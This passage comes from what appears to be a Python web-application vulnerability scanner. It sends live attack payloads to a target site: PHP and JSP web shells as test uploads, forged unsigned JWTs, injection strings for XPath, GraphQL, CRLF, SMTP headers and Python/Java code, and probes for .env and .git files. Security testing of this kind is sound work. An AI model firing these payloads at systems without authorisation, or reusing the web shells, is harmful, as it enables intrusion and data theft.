                            logger.warning("insecure_deserialization_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_host_header_injection(self):
        """Test for Host header injection vulnerabilities."""
        logger.info("testing_host_header_injection")
        
        malicious_hosts = [
            "evil.com",
            "localhost:8080",
            "127.0.0.1:8080"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for host in malicious_hosts:
                    try:
                        response = await client.get(url, headers={"Host": host})
                        
                        if host in response.text:
                            self.vulnerabilities.append({
                                "type": "Host Header Injection",
                                "severity": "MEDIUM",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": f"Host: {host}",
                                "evidence": "Malicious host reflected in response"
                            })
                            logger.warning("host_header_injection_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_jwt_vulnerabilities(self):
        """Test for JWT vulnerabilities."""
        logger.info("testing_jwt_vulnerabilities")
        
        none_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0."
        weak_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.test"
        
        payloads = [none_jwt, weak_jwt]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        response = await client.get(
                            url,
                            headers={"Authorization": f"Bearer {payload}"}
                        )
                        
                        if response.status_code == 200:
                            self.vulnerabilities.append({
                                "type": "JWT Vulnerabilities",
                                "severity": "HIGH",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": "Malicious JWT",
                                "evidence": "Weak JWT validation detected"
                            })
                            logger.warning("jwt_vulnerability_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_graphql_injection(self):
        """Test for GraphQL injection vulnerabilities."""
        logger.info("testing_graphql_injection")
        
        introspection_query = {
            "query": "{ __schema { types { name } } }"
        }
        
        injection_payloads = [
            {"query": "{ user(id: \"1' OR '1'='1\") { name } }"},
            {"query": "{ users { password } }"}
        ]
        
        # Only test GraphQL endpoints that were discovered
        graphql_endpoints = [ep for ep in self.endpoints 
                           if 'graphql' in ep['path'].lower()]
        
        # If no GraphQL endpoints found, try common ones
        if not graphql_endpoints:
            graphql_paths = ['/graphql', '/api/graphql', '/v1/graphql']
            async with httpx.AsyncClient(timeout=self.timeout) as client:
                for path in graphql_paths:
                    try:
                        test_url = urljoin(self.base_url, path)
                        check = await client.post(test_url, json=introspection_query)
                        if check.status_code != 404:
                            graphql_endpoints.append({"path": path, "concrete_path": path})
                    except:
                        pass
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in graphql_endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                try:
                    response = await client.post(url, json=introspection_query)
                    
                    if response.status_code == 200 and '__schema' in response.text:
                        self.vulnerabilities.append({
                            "type": "GraphQL Injection",
                            "severity": "MEDIUM",
                            "endpoint": path,
                            "method": "POST",
                            "payload": "Introspection query",
                            "evidence": "GraphQL introspection enabled"
                        })
                        logger.warning("graphql_introspection_found", endpoint=path)
                    
                    for payload in injection_payloads:
                        response = await client.post(url, json=payload)
                        if response.status_code == 200:
                            response_text = response.text.lower()
                            if 'password' in response_text or 'user' in response_text:
                                self.vulnerabilities.append({
                                    "type": "GraphQL Injection",
                                    "severity": "HIGH",
                                    "endpoint": path,
                                    "method": "POST",
                                    "payload": str(payload),
                                    "evidence": "GraphQL injection successful"
                                })
                                logger.warning("graphql_injection_found", endpoint=path)
                                break
                except:
                    pass
    
    async def _test_file_upload(self):
        """Test for file upload vulnerabilities."""
        logger.info("testing_file_upload")
        
        php_shell = b"<?php system($_GET['cmd']); ?>"
        jsp_shell = b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
        
        files_to_test = [
            ("shell.php", php_shell, "application/x-php"),
            ("shell.jsp", jsp_shell, "application/x-jsp"),
            ("shell.php.jpg", php_shell, "image/jpeg"),
            ("shell.jpg", php_shell, "image/jpeg")
        ]
        
        # Only test upload endpoints that were discovered
        upload_endpoints = [ep for ep in self.endpoints 
                          if any(keyword in ep['path'].lower() 
                                for keyword in ['upload', 'file', 'attachment', 'media'])]
        
        # If no upload endpoints found, try common ones
        if not upload_endpoints:
            upload_paths = ['/upload', '/api/upload', '/file/upload']
            async with httpx.AsyncClient(timeout=self.timeout) as client:
                for path in upload_paths:
                    try:
                        test_url = urljoin(self.base_url, path)
                        check = await client.get(test_url)
                        if check.status_code != 404:
                            upload_endpoints.append({"path": path, "concrete_path": path})
                    except:
                        pass
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in upload_endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for filename, content, content_type in files_to_test:
                    try:
                        files = {'file': (filename, content, content_type)}
                        response = await client.post(url, files=files)
                        
                        if response.status_code in [200, 201]:
                            self.vulnerabilities.append({
                                "type": "File Upload Vulnerability",
                                "severity": "CRITICAL",
                                "endpoint": path,
                                "method": "POST",
                                "payload": filename,
                                "evidence": "Malicious file upload accepted"
                            })
                            logger.warning("file_upload_vulnerability_found", endpoint=path)
                            break
                    except:
                        pass
    
    # ==================== PHASE 2: 10 CRITICAL TESTS (26-35) ====================
    
    async def _test_xpath_injection(self):
        """Test for XPath injection vulnerabilities."""
        logger.info("testing_xpath_injection")
        
        payloads = [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or name()='username' or 'x'='y",
            "admin' or '1'='1",
            "' or count(parent::*[position()=1])=0 or 'a'='b"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        test_url = f"{url}?search={quote(payload)}"
                        response = await client.get(test_url)
                        
                        # Check for XPath errors or unexpected data exposure
                        xpath_indicators = ['xpath', 'xml', 'syntax', 'expression', 'node']
                        if any(ind in response.text.lower() for ind in xpath_indicators):
                            if response.status_code == 200 and len(response.text) > 100:
                                self.vulnerabilities.append({
                                    "type": "XPath Injection",
                                    "severity": "HIGH",
                                    "endpoint": endpoint['path'],
                                    "method": "GET",
                                    "payload": payload,
                                    "evidence": "XPath query manipulation detected"
                                })
                                logger.warning("xpath_injection_found", endpoint=endpoint['path'])
                                break
                    except:
                        pass
    
    async def _test_crlf_injection(self):
        """Test for CRLF injection (HTTP response splitting)."""
        logger.info("testing_crlf_injection")
        
        payloads = [
            "%0d%0aSet-Cookie:admin=true",
            "%0d%0aLocation:http://evil.com",
            "%0aSet-Cookie:session=hijacked",
            "\r\nSet-Cookie:admin=true",
            "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=False) as client:
            for endpoint in self.endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        test_url = f"{url}?redirect={payload}"
                        response = await client.get(test_url)
                        
                        # Check if CRLF characters affected headers
                        if 'Set-Cookie' in response.headers or 'Location' in response.headers:
                            header_str = str(response.headers)
                            if 'admin' in header_str or 'evil.com' in header_str:
                                self.vulnerabilities.append({
                                    "type": "CRLF Injection",
                                    "severity": "HIGH",
                                    "endpoint": endpoint['path'],
                                    "method": "GET",
                                    "payload": payload,
                                    "evidence": "HTTP response splitting detected"
                                })
                                logger.warning("crlf_injection_found", endpoint=endpoint['path'])
                                break
                    except:
                        pass
    
    async def _test_session_fixation(self):
        """Test for session fixation vulnerabilities."""
        logger.info("testing_session_fixation")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            # Look for login endpoints
            login_keywords = ['login', 'signin', 'auth']
            login_endpoints = [ep for ep in self.endpoints 
                             if any(keyword in ep['path'].lower() for keyword in login_keywords)]
            
            for endpoint in login_endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                try:
                    # Set a custom session ID
                    fixed_session = "fixed_session_12345"
                    cookies = {"PHPSESSID": fixed_session, "session": fixed_session}
                    
                    # Try to login with fixed session
                    response = await client.post(
                        url,
                        json={"username": "test", "password": "test"},
                        cookies=cookies
                    )
                    
                    # Check if session ID remained the same
                    if response.cookies:
                        session_cookie = response.cookies.get("PHPSESSID") or response.cookies.get("session")
                        if session_cookie == fixed_session:
                            self.vulnerabilities.append({
                                "type": "Session Fixation",
                                "severity": "HIGH",
                                "endpoint": endpoint['path'],
                                "method": "POST",
                                "payload": "Fixed session ID",
                                "evidence": "Session ID not regenerated after login"
                            })
                            logger.warning("session_fixation_found", endpoint=endpoint['path'])
                except:
                    pass
    
    async def _test_privilege_escalation(self):
        """Test for vertical privilege escalation."""
        logger.info("testing_privilege_escalation")
        
        # Admin/privileged endpoints to test
        admin_paths = ['/admin', '/api/admin', '/dashboard', '/users', '/api/users']
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for admin_path in admin_paths:
                # Check if path exists in discovered endpoints or test directly
                url = urljoin(self.base_url, admin_path)
                
                try:
                    # Try accessing without authentication
                    response = await client.get(url)
                    
                    if response.status_code == 200:
                        response_text = response.text.lower()
                        admin_indicators = ['admin', 'dashboard', 'users', 'settings', 'config']
                        if any(ind in response_text for ind in admin_indicators):
                            self.vulnerabilities.append({
                                "type": "Privilege Escalation",
                                "severity": "CRITICAL",
                                "endpoint": admin_path,
                                "method": "GET",
                                "payload": "Unauthenticated access",
                                "evidence": "Admin functionality accessible without proper authorization"
                            })
                            logger.warning("privilege_escalation_found", endpoint=admin_path)
                except:
                    pass
    
    async def _test_information_disclosure(self):
        """Test for information disclosure through error messages."""
        logger.info("testing_information_disclosure")
        
        # Payloads designed to trigger errors
        error_payloads = [
            "../../../../etc/passwd",
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "{{7*7}}",
            "../../../",
            "null",
            "undefined",
            "999999999"
        ]
        
        sensitive_patterns = [
            'stack trace', 'traceback', 'exception', 'error', 'debug',
            'sql', 'database', 'password', 'secret', 'token', 'api_key',
            'file not found', 'permission denied', 'access denied',
            'at line', 'in file', 'function', 'class', 'method'
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints[:10]:  # Test first 10 endpoints
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in error_payloads:
                    try:
                        test_url = f"{url}?param={quote(payload)}"
                        response = await client.get(test_url)
                        
                        response_text = response.text.lower()
                        found_patterns = [p for p in sensitive_patterns if p in response_text]
                        
                        if len(found_patterns) >= 2:  # Multiple indicators
                            self.vulnerabilities.append({
                                "type": "Information Disclosure",
                                "severity": "MEDIUM",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": payload,
                                "evidence": f"Sensitive information exposed: {', '.join(found_patterns[:3])}"
                            })
                            logger.warning("information_disclosure_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_backup_files(self):
        """Test for exposed backup files."""
        logger.info("testing_backup_files")
        
        # Common backup file extensions and patterns
        backup_patterns = [
            '.bak', '.old', '.backup', '.swp', '~', '.orig', '.save',
            '.tmp', '.temp', '.copy', '.bkp', '.back'
        ]
        
        # Common files that might have backups
        common_files = [
            'index', 'config', 'database', 'settings', 'admin',
            'login', 'user', 'api', 'app', 'main'
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for file_base in common_files:
                for ext in ['.php', '.js', '.py', '.java', '.asp', '.jsp']:
                    for backup_ext in backup_patterns:
                        backup_file = f"/{file_base}{ext}{backup_ext}"
                        url = urljoin(self.base_url, backup_file)
                        
                        try:
                            response = await client.get(url)
                            
                            if response.status_code == 200:
                                # Check if it looks like source code
                                content = response.text[:500].lower()
                                code_indicators = ['function', 'class', 'import', 'require', 'include', 'var', 'const']
                                if any(ind in content for ind in code_indicators):
                                    self.vulnerabilities.append({
                                        "type": "Backup File Exposure",
                                        "severity": "HIGH",
                                        "endpoint": backup_file,
                                        "method": "GET",
                                        "payload": "N/A",
                                        "evidence": "Backup file containing source code accessible"
                                    })
                                    logger.warning("backup_file_found", file=backup_file)
                                    return  # Found one, that's enough
                        except:
                            pass
    
    async def _test_weak_ssl_tls(self):
        """Test for weak SSL/TLS configuration."""
        logger.info("testing_weak_ssl_tls")
        
        # Only test HTTPS sites
        if not self.base_url.startswith('https://'):
            logger.info("skipping_ssl_test", reason="Not an HTTPS site")
            return
        
        try:
            import ssl
            import socket
            from urllib.parse import urlparse
            
            parsed = urlparse(self.base_url)
            hostname = parsed.hostname
            port = parsed.port or 443
            
            # Test for weak protocols
            weak_protocols = [
                (ssl.PROTOCOL_SSLv3, "SSLv3"),
                (ssl.PROTOCOL_TLSv1, "TLSv1.0"),
                (ssl.PROTOCOL_TLSv1_1, "TLSv1.1")
            ]
            
            for protocol, name in weak_protocols:
                try:
                    context = ssl.SSLContext(protocol)
                    with socket.create_connection((hostname, port), timeout=5) as sock:
                        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                            self.vulnerabilities.append({
                                "type": "Weak SSL/TLS Configuration",
                                "severity": "HIGH",
                                "endpoint": "/",
                                "method": "N/A",
                                "payload": name,
                                "evidence": f"Server accepts weak protocol: {name}"
                            })
                            logger.warning("weak_ssl_found", protocol=name)
                            return
                except:
                    pass  # Protocol not supported, which is good
        except Exception as e:
            logger.debug("ssl_test_error", error=str(e))
    
    async def _test_dom_xss(self):
        """Test for DOM-based XSS vulnerabilities."""
        logger.info("testing_dom_xss")
        
        # DOM XSS payloads that work in URL fragments
        payloads = [
            "#<img src=x onerror=alert(1)>",
            "#<svg/onload=alert(1)>",
            "#javascript:alert(1)",
            "#<iframe src=javascript:alert(1)>",
            "#'><script>alert(1)</script>"
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints[:5]:  # Test first 5 endpoints
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                try:
                    # Get the page to analyze JavaScript
                    response = await client.get(url)
                    
                    if response.status_code == 200:
                        content = response.text
                        
                        # Look for dangerous DOM operations
                        dangerous_patterns = [
                            'document.write', 'innerHTML', 'outerHTML',
                            'document.location', 'window.location',
                            'eval(', 'setTimeout(', 'setInterval(',
                            'document.URL', 'document.documentURI',
                            'location.hash', 'location.search'
                        ]
                        
                        found_patterns = [p for p in dangerous_patterns if p in content]
                        
                        if len(found_patterns) >= 2:
                            self.vulnerabilities.append({
                                "type": "DOM-based XSS",
                                "severity": "HIGH",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": "DOM manipulation detected",
                                "evidence": f"Dangerous DOM operations found: {', '.join(found_patterns[:3])}"
                            })
                            logger.warning("dom_xss_found", endpoint=endpoint['path'])
                            break
                except:
                    pass
    
    async def _test_clickjacking(self):
        """Test for clickjacking vulnerabilities."""
        logger.info("testing_clickjacking")
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            try:
                response = await client.get(self.base_url)
                
                # Check for X-Frame-Options header
                x_frame_options = response.headers.get('X-Frame-Options', '').upper()
                
                # Check for CSP frame-ancestors
                csp = response.headers.get('Content-Security-Policy', '').lower()
                has_frame_ancestors = 'frame-ancestors' in csp
                
                # Vulnerable if neither protection is present
                if not x_frame_options and not has_frame_ancestors:
                    self.vulnerabilities.append({
                        "type": "Clickjacking",
                        "severity": "MEDIUM",
                        "endpoint": "/",
                        "method": "GET",
                        "payload": "N/A",
                        "evidence": "No X-Frame-Options or CSP frame-ancestors directive"
                    })
                    logger.warning("clickjacking_vulnerability_found")
                elif x_frame_options not in ['DENY', 'SAMEORIGIN'] and not has_frame_ancestors:
                    self.vulnerabilities.append({
                        "type": "Clickjacking",
                        "severity": "MEDIUM",
                        "endpoint": "/",
                        "method": "GET",
                        "payload": "N/A",
                        "evidence": f"Weak X-Frame-Options: {x_frame_options}"
                    })
                    logger.warning("weak_clickjacking_protection_found")
            except:
                pass
    
    async def _test_http_methods(self):
        """Test for dangerous HTTP methods enabled."""
        logger.info("testing_http_methods")
        
        dangerous_methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT', 'PATCH']
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints[:5]:  # Test first 5 endpoints
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                # First, check OPTIONS to see allowed methods
                try:
                    options_response = await client.request('OPTIONS', url)
                    allow_header = options_response.headers.get('Allow', '')
                    
                    dangerous_found = [m for m in dangerous_methods if m in allow_header.upper()]
                    
                    if dangerous_found:
                        self.vulnerabilities.append({
                            "type": "Dangerous HTTP Methods",
                            "severity": "MEDIUM",
                            "endpoint": endpoint['path'],
                            "method": "OPTIONS",
                            "payload": "N/A",
                            "evidence": f"Dangerous methods enabled: {', '.join(dangerous_found)}"
                        })
                        logger.warning("dangerous_http_methods_found", 
                                     endpoint=endpoint['path'],
                                     methods=dangerous_found)
                except:
                    pass
                
                # Test TRACE method specifically (can lead to XST)
                try:
                    trace_response = await client.request('TRACE', url)
                    if trace_response.status_code == 200:
                        self.vulnerabilities.append({
                            "type": "HTTP TRACE Method Enabled",
                            "severity": "MEDIUM",
                            "endpoint": endpoint['path'],
                            "method": "TRACE",
                            "payload": "N/A",
                            "evidence": "TRACE method enabled (XST vulnerability)"
                        })
                        logger.warning("trace_method_enabled", endpoint=endpoint['path'])
                        break
                except:
                    pass
    
    # ==================== PHASE 3: 10 HIGH-VALUE TESTS (36-45) ====================
    
    async def _test_email_header_injection(self):
        """Test for email header injection (SMTP injection)."""
        logger.info("testing_email_header_injection")
        
        # Payloads to inject additional headers
        payloads = [
            "victim@test.com\nBcc: attacker@evil.com",
            "victim@test.com\r\nCc: attacker@evil.com",
            "victim@test.com%0aBcc:attacker@evil.com",
            "victim@test.com\nSubject: Injected Subject",
            "victim@test.com%0d%0aBcc:attacker@evil.com"
        ]
        
        # Look for contact/email endpoints
        email_keywords = ['contact', 'email', 'send', 'mail', 'feedback']
        email_endpoints = [ep for ep in self.endpoints 
                          if any(keyword in ep['path'].lower() for keyword in email_keywords)]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in email_endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        response = await client.post(
                            url,
                            json={"email": payload, "message": "test"}
                        )
                        
                        # Check if injection succeeded (usually returns success)
                        if response.status_code in [200, 201]:
                            response_text = response.text.lower()
                            if 'sent' in response_text or 'success' in response_text:
                                self.vulnerabilities.append({
                                    "type": "Email Header Injection",
                                    "severity": "HIGH",
                                    "endpoint": endpoint['path'],
                                    "method": "POST",
                                    "payload": payload,
                                    "evidence": "Email header injection possible"
                                })
                                logger.warning("email_header_injection_found", endpoint=endpoint['path'])
                                break
                    except:
                        pass
    
    async def _test_code_injection(self):
        """Test for code injection (eval, exec exploitation)."""
        logger.info("testing_code_injection")
        
        # Code injection payloads for different languages
        payloads = [
            "__import__('os').system('id')",  # Python
            "eval('2+2')",  # JavaScript/Python
            "exec('import os')",  # Python
            "${7*7}",  # Expression Language
            "#{7*7}",  # Ruby/EL
            "Runtime.getRuntime().exec('id')",  # Java
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints[:10]:  # Test first 10
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for payload in payloads:
                    try:
                        test_url = f"{url}?expr={quote(payload)}"
                        response = await client.get(test_url)
                        
                        # Check for code execution indicators
                        indicators = ['uid=', 'gid=', '49', 'import', 'runtime']
                        if any(ind in response.text.lower() for ind in indicators):
                            self.vulnerabilities.append({
                                "type": "Code Injection",
                                "severity": "CRITICAL",
                                "endpoint": endpoint['path'],
                                "method": "GET",
                                "payload": payload,
                                "evidence": "Code execution detected"
                            })
                            logger.warning("code_injection_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_account_enumeration(self):
        """Test for username/email enumeration."""
        logger.info("testing_account_enumeration")
        
        # Test usernames
        test_users = ['admin', 'test', 'user', 'root', 'administrator']
        
        # Look for login/register endpoints
        auth_keywords = ['login', 'register', 'signup', 'forgot', 'reset']
        auth_endpoints = [ep for ep in self.endpoints 
                         if any(keyword in ep['path'].lower() for keyword in auth_keywords)]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in auth_endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                responses = {}
                for username in test_users:
                    try:
                        response = await client.post(
                            url,
                            json={"username": username, "password": "wrongpassword"}
                        )
                        
                        # Store response characteristics
                        responses[username] = {
                            'status': response.status_code,
                            'length': len(response.text),
                            'time': response.elapsed.total_seconds() if hasattr(response, 'elapsed') else 0,
                            'text': response.text[:200].lower()
                        }
                    except:
                        pass
                
                # Check for differences that indicate enumeration
                if len(responses) >= 2:
                    statuses = [r['status'] for r in responses.values()]
                    lengths = [r['length'] for r in responses.values()]
                    texts = [r['text'] for r in responses.values()]
                    
                    # Different responses indicate enumeration
                    if len(set(statuses)) > 1 or len(set(lengths)) > 1 or len(set(texts)) > 1:
                        self.vulnerabilities.append({
                            "type": "Account Enumeration",
                            "severity": "MEDIUM",
                            "endpoint": endpoint['path'],
                            "method": "POST",
                            "payload": "Username enumeration",
                            "evidence": "Different responses for valid/invalid usernames"
                        })
                        logger.warning("account_enumeration_found", endpoint=endpoint['path'])
                        break
    
    async def _test_missing_function_level_access(self):
        """Test for missing function-level access control."""
        logger.info("testing_missing_function_level_access")
        
        # Admin/privileged functions to test
        admin_functions = [
            '/api/admin/users',
            '/api/admin/settings',
            '/api/users/delete',
            '/api/config',
            '/admin/delete',
            '/api/admin/logs'
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for func_path in admin_functions:
                url = urljoin(self.base_url, func_path)
                
                # Try different HTTP methods
                for method in ['GET', 'POST', 'DELETE', 'PUT']:
                    try:
                        response = await client.request(method, url)
                        
                        # If we get 200 instead of 401/403, it's vulnerable
                        if response.status_code == 200:
                            self.vulnerabilities.append({
                                "type": "Missing Function Level Access Control",
                                "severity": "CRITICAL",
                                "endpoint": func_path,
                                "method": method,
                                "payload": "Unauthenticated access",
                                "evidence": f"Admin function accessible via {method}"
                            })
                            logger.warning("missing_function_access_found", 
                                         endpoint=func_path, 
                                         method=method)
                            break
                    except:
                        pass
    
    async def _test_source_code_disclosure(self):
        """Test for source code disclosure (.git, .svn, .env)."""
        logger.info("testing_source_code_disclosure")
        
        # Common source control and config files
        disclosure_paths = [
            '/.git/config',
            '/.git/HEAD',
            '/.svn/entries',
            '/.env',
            '/.env.local',
            '/.env.production',
            '/config.php',
            '/configuration.php',
            '/web.config',
            '/.htaccess',
            '/composer.json',
            '/package.json',
            '/.DS_Store',
            '/phpinfo.php'
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for path in disclosure_paths:
                url = urljoin(self.base_url, path)
                
                try:
                    response = await client.get(url)
                    
                    if response.status_code == 200:
                        content = response.text[:500].lower()
                        
                        # Check for indicators of source code/config
                        indicators = {
                            '.git': ['[core]', 'repositoryformatversion', 'ref:'],
                            '.svn': ['svn', 'entries', 'dir'],
                            '.env': ['api_key', 'password', 'secret', 'token', 'db_'],
                            'config': ['<?php', 'password', 'database', 'host'],
                            'package.json': ['"name":', '"version":', '"dependencies":'],
                            'composer.json': ['"require":', '"autoload":'],
                            'phpinfo': ['php version', 'system', 'build']
                        }
                        
                        for file_type, patterns in indicators.items():
                            if any(pattern in content for pattern in patterns):
                                self.vulnerabilities.append({
                                    "type": "Source Code Disclosure",
                                    "severity": "CRITICAL",
                                    "endpoint": path,
                                    "method": "GET",
                                    "payload": "N/A",
                                    "evidence": f"Sensitive file exposed: {path}"
                                })
                                logger.warning("source_code_disclosure_found", file=path)
                                return  # Found one, that's enough
                except:
                    pass
    
    async def _test_certificate_validation(self):
        """Test for certificate validation issues."""
        logger.info("testing_certificate_validation")
        
        # Only test HTTPS sites
        if not self.base_url.startswith('https://'):
            return
        
        try:
            import ssl
            import socket
            from urllib.parse import urlparse
            from datetime import datetime
            
            parsed = urlparse(self.base_url)
            hostname = parsed.hostname
            port = parsed.port or 443
            
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_until_expiry = (not_after - datetime.now()).days
                    
                    if days_until_expiry < 0:
                        self.vulnerabilities.append({
                            "type": "Certificate Validation",
                            "severity": "CRITICAL",
                            "endpoint": "/",
                            "method": "N/A",
                            "payload": "Expired certificate",
                            "evidence": f"Certificate expired {abs(days_until_expiry)} days ago"
                        })
                        logger.warning("expired_certificate_found")
                    elif days_until_expiry < 30:
                        self.vulnerabilities.append({
                            "type": "Certificate Validation",
                            "severity": "MEDIUM",
                            "endpoint": "/",
                            "method": "N/A",
                            "payload": "Expiring soon",
                            "evidence": f"Certificate expires in {days_until_expiry} days"
                        })
                        logger.warning("expiring_certificate_found", days=days_until_expiry)
        except ssl.SSLError as e:
            self.vulnerabilities.append({
                "type": "Certificate Validation",
                "severity": "HIGH",
                "endpoint": "/",
                "method": "N/A",
                "payload": "SSL Error",
                "evidence": f"Certificate validation failed: {str(e)}"
            })
            logger.warning("certificate_validation_failed", error=str(e))
        except Exception as e:
            logger.debug("certificate_test_error", error=str(e))
    
    async def _test_price_manipulation(self):
        """Test for price/quantity manipulation vulnerabilities."""
        logger.info("testing_price_manipulation")
        
        # Look for cart/order/payment endpoints
        commerce_keywords = ['cart', 'order', 'checkout', 'payment', 'purchase', 'buy']
        commerce_endpoints = [ep for ep in self.endpoints 
                             if any(keyword in ep['path'].lower() for keyword in commerce_keywords)]
        
        # Malicious price/quantity values
        test_values = [
            {"price": -100, "quantity": 1},  # Negative price
            {"price": 0, "quantity": 1},  # Zero price
            {"price": 0.01, "quantity": 1},  # Extremely low price
            {"price": 100, "quantity": -1},  # Negative quantity
            {"price": 100, "quantity": 999999},  # Integer overflow
            {"price": "100.00", "quantity": "1.5"},  # Decimal quantity
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in commerce_endpoints:
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for test_data in test_values:
                    try:
                        response = await client.post(url, json=test_data)
                        
                        # If request succeeds with malicious values
                        if response.status_code in [200, 201]:
                            self.vulnerabilities.append({
                                "type": "Price Manipulation",
                                "severity": "CRITICAL",
                                "endpoint": endpoint['path'],
                                "method": "POST",
                                "payload": str(test_data),
                                "evidence": "Malicious price/quantity values accepted"
                            })
                            logger.warning("price_manipulation_found", endpoint=endpoint['path'])
                            break
                    except:
                        pass
    
    async def _test_api_versioning(self):
        """Test for old API versions with vulnerabilities."""
        logger.info("testing_api_versioning")
        
        # Common API version patterns
        version_patterns = [
            '/api/v1/', '/api/v2/', '/api/v3/',
            '/v1/', '/v2/', '/v3/',
            '/api/1.0/', '/api/2.0/',
            '/api/old/', '/api/legacy/'
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            accessible_versions = []
            
            for version in version_patterns:
                url = urljoin(self.base_url, version)
                
                try:
                    response = await client.get(url)
                    
                    if response.status_code == 200:
                        accessible_versions.append(version)
                except:
                    pass
            
            # If multiple versions are accessible, it's a potential issue
            if len(accessible_versions) > 1:
                self.vulnerabilities.append({
                    "type": "API Versioning Issues",
                    "severity": "MEDIUM",
                    "endpoint": ", ".join(accessible_versions),
                    "method": "GET",
                    "payload": "N/A",
                    "evidence": f"Multiple API versions accessible: {', '.join(accessible_versions)}"
                })
                logger.warning("multiple_api_versions_found", versions=accessible_versions)
    
    async def _test_websocket_vulnerabilities(self):
        """Test for WebSocket vulnerabilities."""
        logger.info("testing_websocket_vulnerabilities")
        
        # Look for WebSocket endpoints
        ws_patterns = ['/ws', '/websocket', '/socket.io', '/api/ws']
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for ws_path in ws_patterns:
                url = urljoin(self.base_url, ws_path)
                
                try:
                    # Try to access WebSocket endpoint via HTTP
                    response = await client.get(url)
                    
                    # Check for WebSocket indicators
                    if response.status_code in [101, 426]:  # Switching Protocols, Upgrade Required
                        # WebSocket found, check for security headers
                        origin = response.headers.get('Sec-WebSocket-Origin', '')
                        
                        if not origin or origin == '*':
                            self.vulnerabilities.append({
                                "type": "WebSocket Vulnerabilities",
                                "severity": "MEDIUM",
                                "endpoint": ws_path,
                                "method": "GET",
                                "payload": "N/A",
                                "evidence": "WebSocket endpoint with weak origin validation"
                            })
                            logger.warning("websocket_vulnerability_found", endpoint=ws_path)
                    
                    # Check if WebSocket is mentioned in response
                    if 'websocket' in response.text.lower():
                        self.vulnerabilities.append({
                            "type": "WebSocket Vulnerabilities",
                            "severity": "LOW",
                            "endpoint": ws_path,
                            "method": "GET",
                            "payload": "N/A",
                            "evidence": "WebSocket endpoint detected (manual testing recommended)"
                        })
                        logger.info("websocket_endpoint_found", endpoint=ws_path)
                except:
                    pass
    
    async def _test_cache_poisoning(self):
        """Test for HTTP cache poisoning vulnerabilities."""
        logger.info("testing_cache_poisoning")
        
        # Headers that might affect caching
        poison_headers = [
            {"X-Forwarded-Host": "evil.com"},
            {"X-Forwarded-Scheme": "http"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Host": "evil.com"}
        ]
        
        async with httpx.AsyncClient(timeout=self.timeout) as client:
            for endpoint in self.endpoints[:5]:  # Test first 5
                url = urljoin(self.base_url, endpoint['concrete_path'])
                
                for headers in poison_headers:
